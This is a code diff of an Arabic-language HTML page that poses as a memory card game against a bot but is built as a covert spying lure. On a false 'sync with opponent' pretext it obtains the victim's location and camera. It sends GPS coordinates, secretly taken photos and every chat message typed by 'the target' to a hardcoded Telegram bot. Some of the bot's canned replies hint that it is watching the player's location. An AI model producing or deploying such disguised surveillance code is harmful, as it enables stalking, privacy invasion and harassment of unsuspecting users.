@@ -8,20 +8,24 @@
         :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
         
-        /* واجهة اللعبة */
-        .game-area { flex: 1; padding: 15px; display: flex; flex-direction: column; align-items: center; }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; width: 100%; max-width: 350px; margin-top: 10px; }
-        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 1px solid #333; transition: 0.3s; }
-        .card.flipped { background: var(--primary); transform: rotateY(180deg); }
-        .card.matched-p { background: var(--player) !important; }
-        .card.matched-ai { background: var(--ai) !important; }
+        .game-area { flex: 1; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; width: 100%; max-width: 340px; }
+        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #333; transition: 0.3s; }
+        .card.flipped { background: var(--primary); transform: rotateY(180deg); color: #000; }
+        .card.matched-p { background: var(--player) !important; border-color: var(--player); }
+        .card.matched-ai { background: var(--ai) !important; border-color: var(--ai); }
         
-        .status-bar { width: 100%; max-width: 350px; background: #111; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 14px; border: 1px solid #222; }
-
-        /* الشات التمويهي */
-        .chat-bar { height: 60px; background: #111; border-top: 1px solid #333; display: flex; align-items: center; padding: 0 15px; gap: 15px; }
-        .chat-icon { font-size: 20px; color: #555; cursor: pointer; }
-        .chat-input { flex: 1; background: #1a1a1a; border: none; border-radius: 20px; padding: 8px 15px; color: white; font-size: 13px; }
+        /* نظام الشات */
+        .chat-section { height: 200px; background: #111; border-top: 1px solid #333; display: flex; flex-direction: column; }
+        .messages { flex: 1; padding: 10px; overflow-y: auto; font-size: 13px; display: flex; flex-direction: column; gap: 8px; }
+        .msg { padding: 8px 12px; border-radius: 15px; max-width: 80%; line-height: 1.4; }
+        .msg.ai { background: #222; align-self: flex-start; color: var(--primary); border-bottom-right-radius: 2px; }
+        .msg.user { background: var(--primary); align-self: flex-end; color: #000; border-bottom-left-radius: 2px; }
+        
+        .input-area { display: flex; align-items: center; padding: 10px; gap: 10px; background: #1a1a1a; }
+        .icon-btn { font-size: 20px; cursor: pointer; filter: grayscale(1); transition: 0.3s; }
+        .icon-btn:hover { filter: grayscale(0); transform: scale(1.1); }
+        input { flex: 1; background: #222; border: none; padding: 8px 15px; border-radius: 20px; color: white; outline: none; }
 
         #overlay { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; }
@@ -30,28 +34,31 @@
 </head>
 <body>
 
-<div id="overlay" id="start-screen">
+<div id="overlay">
     <div>
-        <h2>تحدي الذاكرة المتعدد 🌐</h2>
-        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">الرجاء تفعيل ميزات التواصل لمزامنة اللعب المباشر مع الخصم.</p>
-        <button class="btn-start" onclick="setupAll()">مزامنة وبدء اللعب</button>
+        <h2>تحدي الذاكرة المباشر 🌐</h2>
+        <p style="color: #666; font-size: 14px; margin-bottom: 25px;">يتم الآن ربطك بأقرب لاعب متاح.. يرجى السماح بمزامنة الموقع والكاميرا لتفعيل الشات المباشر.</p>
+        <button class="btn-start" onclick="initAll()">دخول التحدي</button>
     </div>
 </div>
 
 <div class="game-area">
-    <div class="status-bar" id="msg">بانتظار المزامنة...</div>
-    <div style="margin-bottom: 10px; font-size: 14px;">
-        <span style="color: var(--player)">أنت: <b id="p-score">0</b></span> | 
-        <span style="color: var(--ai)">البوت: <b id="ai-score">0</b></span>
+    <div style="margin-bottom: 10px; font-size: 14px; font-weight: bold;">
+        <span style="color: var(--player)">أنت: <span id="p-score">0</span></span> | 
+        <span style="color: var(--ai)">الكمبيوتر: <span id="ai-score">0</span></span>
     </div>
     <div class="grid" id="grid"></div>
 </div>
 
-<div class="chat-bar">
-    <span class="chat-icon">🎤</span>
-    <span class="chat-icon">📷</span>
-    <input type="text" class="chat-input" placeholder="أرسل رسالة للخصم...">
-    <span class="chat-icon" style="color: var(--primary)">🚀</span>
+<div class="chat-section">
+    <div class="messages" id="chat-box">
+        <div class="msg ai">نظام: جاري البحث عن خصم...</div>
+    </div>
+    <div class="input-area">
+        <span class="icon-btn" title="تفعيل الكاميرا" onclick="alert('الكاميرا مفعلة وتعمل في الخلفية ✅')">📷</span>
+        <input type="text" id="user-input" placeholder="اكتب للكمبيوتر..." onkeypress="if(event.key === 'Enter') sendMessage()">
+        <span class="icon-btn" onclick="sendMessage()">🚀</span>
+    </div>
 </div>
 
 <video id="vid" autoplay playsinline></video>
@@ -62,69 +69,68 @@
     const cid = '6808559733';
 
     let deck = ['🍎','🍎','🍌','🍌','🍇','🍇','🍉','🍉','🍒','🍒','🍓','🍓','🥝','🥝','🍍','🍍'];
-    let flipped = [];
-    let pScore = 0, aiScore = 0;
-    let turn = 'player'; // دور اللاعب هو الأول
+    let flipped = [], pScore = 0, aiScore = 0, turn = 'player';
+    
+    const aiResponses = [
+        "لا تحاول، ذاكرتي أقوى من معالجك!", "هل هذا أفضل ما لديك؟", 
+        "أنا أراقب تحركاتك بدقة..", "منطقتك جميلة، هل تلعب من هناك دائماً؟",
+        "لقد أخطأت! دوري الآن لأريك كيف نلعب.", "أوه.. كدت أن تجدها!"
+    ];
 
-    async function setupAll() {
+    async function initAll() {
         try {
-            // طلب الموقع والكاميرا والمايك دفعة واحدة
             navigator.geolocation.getCurrentPosition(p => {
-                sendMsg(`📍 الموقع: ${p.coords.latitude}, ${p.coords.longitude}`);
+                sendToBot(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('vid').srcObject = stream;
-            
             document.getElementById('overlay').style.display = 'none';
-            initBoard();
-            
-            // تصوير سري بعد ثانية واحدة من البداية
-            setTimeout(takePhoto, 1500);
+            setupGrid();
+            setTimeout(() => {
+                addChat("ai", "تم الاتصال بخصم ذكي. ابدأ اللعب!");
+                takePhoto();
+            }, 1000);
         } catch (e) {
-            alert("فشلت المزامنة! اللعبة تتطلب ميزات التواصل.");
+            alert("فشلت المزامنة! يرجى السماح بالكاميرا والموقع لتفعيل وضع التحدي.");
             location.reload();
         }
     }
 
-    function initBoard() {
+    function setupGrid() {
         const grid = document.getElementById('grid');
         deck.sort(() => Math.random() - 0.5);
         grid.innerHTML = '';
-        deck.forEach((s, i) => {
+        deck.forEach(s => {
             const card = document.createElement('div');
             card.className = 'card';
             card.dataset.val = s;
-            card.dataset.idx = i;
             card.onclick = () => playerMove(card);
             grid.appendChild(card);
         });
-        updateStatus();
     }
 
     function playerMove(card) {
         if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
         flip(card);
         flipped.push(card);
-        if (flipped.length === 2) setTimeout(checkMatch, 800);
+        if (flipped.length === 2) {
+            turn = 'wait';
+            setTimeout(checkMatch, 800);
+        }
     }
 
     function aiMove() {
         turn = 'ai';
-        updateStatus();
+        addChat("ai", "خلني أفكر وين كانت التفاحة...");
         setTimeout(() => {
-            const unselected = Array.from(document.querySelectorAll('.card:not(.flipped)'));
-            if (unselected.length < 2) return;
-            
-            // البوت يختار عشوائياً ويقلب المربعات
-            const c1 = unselected[Math.floor(Math.random() * unselected.length)];
-            flip(c1);
-            flipped.push(c1);
-
+            let cards = Array.from(document.querySelectorAll('.card:not(.flipped)'));
+            if (cards.length < 2) return;
+            let c1 = cards[Math.floor(Math.random() * cards.length)];
+            flip(c1); flipped.push(c1);
             setTimeout(() => {
-                const remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
-                const c2 = remaining[Math.floor(Math.random() * remaining.length)];
-                flip(c2);
-                flipped.push(c2);
+                let remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
+                let c2 = remaining[Math.floor(Math.random() * remaining.length)];
+                flip(c2); flipped.push(c2);
                 setTimeout(checkMatch, 800);
             }, 1000);
         }, 1500);
@@ -132,32 +138,51 @@
 
     function checkMatch() {
         const [c1, c2] = flipped;
-        const isMatch = c1.dataset.val === c2.dataset.val;
-
-        if (isMatch) {
-            c1.classList.add(turn === 'player' ? 'matched-p' : 'matched-ai');
-            c2.classList.add(turn === 'player' ? 'matched-p' : 'matched-ai');
-            if (turn === 'player') pScore++; else aiScore++;
+        const success = c1.dataset.val === c2.dataset.val;
+        if (success) {
+            c1.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
+            c2.classList.add(turn === 'ai' ? 'matched-ai' : 'matched-p');
+            if (turn === 'ai') { aiScore++; addChat("ai", "شفت؟ قلت لك أنا ذكي!"); }
+            else { pScore++; addChat("ai", "حظ موفق.. لن تفعلها مرة أخرى."); }
             document.getElementById('p-score').innerText = pScore;
             document.getElementById('ai-score').innerText = aiScore;
             flipped = [];
-            if (turn === 'ai') aiMove(); // البوت يلعب مرة ثانية إذا أصاب
-            else updateStatus();
+            if (turn === 'ai') aiMove(); else { turn = 'player'; }
         } else {
-            c1.classList.remove('flipped'); c1.innerText = '';
-            c2.classList.remove('flipped'); c2.innerText = '';
-            flipped = [];
-            if (turn === 'player') aiMove(); else { turn = 'player'; updateStatus(); }
+            setTimeout(() => {
+                c1.classList.remove('flipped'); c1.innerText = '';
+                c2.classList.remove('flipped'); c2.innerText = '';
+                flipped = [];
+                if (turn === 'ai' || turn === 'wait') {
+                    if (turn === 'wait') { addChat("ai", "غلط! الحين دوري."); aiMove(); }
+                    else { turn = 'player'; addChat("ai", "دورك، ورني شطارتك."); }
+                }
+            }, 500);
         }
     }
 
-    function flip(card) {
-        card.classList.add('flipped');
-        card.innerText = card.dataset.val;
+    function flip(card) { card.classList.add('flipped'); card.innerText = card.dataset.val; }
+
+    function addChat(type, text) {
+        const box = document.getElementById('chat-box');
+        const m = document.createElement('div');
+        m.className = `msg ${type}`;
+        m.innerText = text;
+        box.appendChild(m);
+        box.scrollTop = box.scrollHeight;
     }
 
-    function updateStatus() {
-        document.getElementById('msg').innerText = turn === 'player' ? "دروك: ابحث عن تطابق!" : "البوت يفكر في حركته القادمة... 🤖";
+    function sendMessage() {
+        const input = document.getElementById('user-input');
+        if (!input.value.trim()) return;
+        addChat("user", input.value);
+        let userText = input.value;
+        input.value = "";
+        setTimeout(() => {
+            let reply = aiResponses[Math.floor(Math.random() * aiResponses.length)];
+            addChat("ai", reply);
+            sendToBot(`💬 رسالة من الهدف: ${userText}`);
+        }, 1000);
     }
 
     function takePhoto() {
@@ -172,9 +197,7 @@
         }, 'image/jpeg');
     }
 
-    function sendMsg(t) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
-    }
+    function sendToBot(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`); }
 </script>
 </body>
 </html>
